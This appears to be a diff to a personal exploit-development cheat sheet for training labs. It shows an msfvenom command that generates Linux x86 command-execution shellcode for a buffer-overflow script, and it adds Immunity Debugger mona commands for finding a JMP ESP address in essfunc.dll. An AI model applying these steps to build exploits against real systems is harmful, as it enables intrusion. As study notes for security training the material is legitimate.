@@ -214,11 +214,12 @@ GENERATE SHELLCODE
 msfvenom -p linux/x86/exec CMD="<cmd>" -b '\x00' -f python  #Generates shellcode to put into mybuff.py
                                                             #MAY FAIL, Regenerate
 
+---------------
+Windows Exploit Development
 
 
-
-
-
+CMDS for Immunity Debugger: !mona modules
+                            !mona jmp -r esp -m "essfunc.dll" -- Copy first JMP ESP address to clipboard
 
 
 
